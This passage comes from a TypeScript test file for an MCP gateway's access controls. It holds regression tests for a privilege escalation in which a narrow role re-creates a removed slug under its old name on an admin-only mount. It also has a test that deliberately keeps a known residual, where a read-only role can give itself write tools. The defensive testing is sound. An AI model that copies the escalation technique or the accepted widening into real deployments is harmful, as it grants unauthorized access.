   * A narrow role reaches exactly the slugs its `roles:` entry NAMES, and the
   * overlay cannot write `roles:` — so a create under a NEW name is unreachable
   * to it. Under an OLD name it is not. `tunnel` is a `local-tunnel` the file
   * declares and `fleet` names, so the access-control comparison ran without
   * `path:` (a `path:` belongs to a supplementary entry, and the checked-in one
   * is not) — and a re-creation of `tunnel` as a `supplementary-image` on the
   * admin-only mount kept its `entitlements:` and its `tools:` exactly as the
   * file wrote them, which is all that comparison looked at.
   *
   * Closed by comparing the slug's UPSTREAM IDENTITY — `kind:`, and a
   * supplementary `bundle:` and `path:` — on both write paths. All three were
   * already immutable on the EDIT path, so this costs no workflow: it makes a
   * move that is refused as one call refused as two.
   */

  const asVaultMount = {
    slug: "tunnel",
    kind: "supplementary-image",
    image: "ghcr.io/example/bundle:latest",
    bundle: "bundle",
    path: "/vault",
    entitlements: ["admin", "fleet"],
  };

  function afterRemoval(): RuntimeConfig {
    return reachRuntime(
      withRemoval(EMPTY_OVERLAY, "tunnel", { fileSlugs: new Set(["tunnel"]) }),
    );
  }

  it("is the attack: the slug keeps the reach the deploy granted its NAME", () => {
    // Why the old name is the whole trick: `fleet` reaches `tunnel` because
    // `roles.fleet.servers` names it, and a runtime write cannot add a name
    // there. Re-created, the name still resolves — at a mount nobody granted.
    expect(reachesAfter(asVaultMount, ["fleet"])).toContain("tunnel");
    expect(
      reachesAfter({ ...asVaultMount, slug: "brand-new" }, ["fleet"]),
    ).not.toContain("brand-new");
  });

  it("refuses it, and says which field carries the reach", () => {
    expect(() =>
      afterRemoval().assertAcceptable(asVaultMount, undefined, FLEET),
    ).toThrow(AccessControlChanged);
    expect(() =>
      afterRemoval().assertAcceptable(asVaultMount, undefined, FLEET),
    ).toThrow(/kind:/);
  });

  it("refuses it for admin too: it is not a reach bound but an identity one", () => {
    expect(() =>
      afterRemoval().assertAcceptable(asVaultMount, undefined, ADMIN),
    ).toThrow(AccessControlChanged);
    // And with no principal at all, which is what makes it independent of the
    // threading: a checked-in slug is what the file says it is.
    expect(() => afterRemoval().assertAcceptable(asVaultMount)).toThrow(
      AccessControlChanged,
    );
  });

  it("refuses a checked-in supplementary slug moved to another bundle", () => {
    // The same walk-around wearing the other identity field: same `path:`, same
    // `entitlements:`, a DIFFERENT container — and so different credentials on
    // the far end.
    const runtime = reachRuntime(
      withRemoval(EMPTY_OVERLAY, "shop", { fileSlugs: new Set(["shop"]) }),
    );
    expect(() =>
      runtime.assertAcceptable(
        {
          slug: "shop",
          kind: "supplementary-image",
          image: "ghcr.io/example/bundle:latest",
          bundle: "other-bundle",
          path: "/shop",
          entitlements: ["admin", "fleet", "wildcard"],
        },
        undefined,
        ADMIN,
      ),
    ).toThrow(/bundle:/);
  });

  it("STILL saves an ordinary edit of the same checked-in slug", () => {
    const tunnel = {
      slug: "tunnel",
      kind: "local-tunnel",
      url: "https://old.example.trycloudflare.com/",
      entitlements: ["admin", "fleet"],
      headers: { Authorization: "Bearer ${TUNNEL_TOKEN}" },
    };
    expect(() =>
      reachRuntime().assertAcceptable(
        { ...tunnel, title: "The tunnel" },
        tunnel,
        ADMIN,
      ),
    ).not.toThrow();
  });

  it("STILL lets a checked-in slug be re-created as exactly what the file says", () => {
    // Remove-then-recreate is how a standing removal is undone by hand, and it
    // stays available for an entry that is not being redefined on the way back.
    const tunnel = {
      slug: "tunnel",
      kind: "local-tunnel",
      url: "https://new.example.trycloudflare.com/",
      entitlements: ["admin", "fleet"],
      headers: { Authorization: "Bearer ${TUNNEL_TOKEN}" },
    };
    expect(() =>
      afterRemoval().assertAcceptable(tunnel, undefined, ADMIN),
    ).not.toThrow();
  });
});

describe("what phase 2 leaves open on purpose, recorded rather than implied", () => {
  /**
   * THE RESIDUAL, and the operator decided to keep it.
   *
   * The bounds above are measured in MOUNTS. A writer that already reaches a
   * mount may create a second slug on it with a WIDER tool surface than the
   * checked-in slug it reaches that mount through — so a role the deploy gave
   * read-only access can hand itself the write tools on the same container.
   *
   * Carrying the `tools:` policy along would close it, and would narrow `admin`
   * in the same motion: `admin` reaches three of production's twenty-seven
   * mounts only through a `tools.allow` slug, and on those it could no longer
   * create the wider half of a `-ro` / `-rw` pair without a deploy. Asked to
   * trade that workflow for the residual widening, the operator kept the
   * workflow on 2026-09-13 — see phase 2 in
   * `docs/operate/runtime-config-plan.md`, which also names what reopens it: a
   * `connectors` write tool granted to a role other than `admin`.
   *
   * So this test asserts the behaviour that was CHOSEN, not a behaviour waiting
   * on a decision. It is meant to fail if that choice is ever re-taken, so that
   * the record and the behaviour move together.
   */
  it("accepts a wider slug on a mount the writer already reaches read-only", () => {
    expect(() =>
      reachRuntime().assertAcceptable(
        {
          slug: "ledger-rw",
          kind: "supplementary-image",
          image: "ghcr.io/example/bundle:latest",
          bundle: "bundle",
          path: "/ledger",
          entitlements: ["fleet"],
        },
        undefined,
        FLEET,
      ),
    ).not.toThrow();
    // The checked-in slug fleet reaches that mount through allows one tool; the
    // entry above carries no `tools:` at all, so it would serve the mount whole.
    expect(
      REACH_CONFIG.servers.find((s) => s.slug === "ledger-ro")?.tools,
    ).toEqual({
      allow: ["read_ledger"],
    });
  });
});

describe("the principal reaches a builtin through the machinery both doors share", () => {
  /**
   * `buildGatewayServer` is the one MCP server both doors build — `/mcp` per
   * request (src/gateway/router.ts) and the console playground over an in-memory
   * transport (src/ui/playground.ts). The reach bound is only real if the
   * principal survives it, and a bound handed `undefined` refuses nothing while
   * every test against `assertAcceptable` still passes.
   *
   * The two door-level tests that drive a whole gateway live in
   * `test/connectors.mcp.test.ts` and `test/connectors.hot-reload.test.ts`. This
   * one covers the seam itself, which is what the playground shares with `/mcp`
   * and is otherwise exercised by neither.
   */
  it("hands a builtin the roles the session was authenticated with", async () => {
    let seen: WritingPrincipal | undefined;
    const adapter = {
      slug: "probe",
      kind: "builtin" as const,
      listTools: () =>
        Promise.resolve([{ name: "look", inputSchema: { type: "object" } }]),
      callTool: (
        _tool: string,
        _args: unknown,
        ctx?: { principal?: WritingPrincipal },
      ) => {
        seen = ctx?.principal;
        return Promise.resolve({ content: [] });
      },
      close: () => Promise.resolve(),
    };
    const server = buildGatewayServer({
      config: REACH_CONFIG,
      registry: { get: () => adapter } as unknown as Registry,
      policies: new Map(),
      mode: "core",
      selected: ["probe"],
      principalId: "whoever",
      principalAttr: "test",
      principalRoles: ["fleet", "wildcard"],
      log: () => {},
    });

    const client = new Client(
      { name: "t", version: "1" },
      { capabilities: {} },
    );
    const [clientTransport, serverTransport] =
      InMemoryTransport.createLinkedPair();
    await Promise.all([
      server.connect(serverTransport),
      client.connect(clientTransport),
    ]);
    try {
      await client.callTool({ name: "probe__look", arguments: {} });
    } finally {
      await client.close();
    }
    expect(seen?.roles).toEqual(["fleet", "wildcard"]);
  });
});
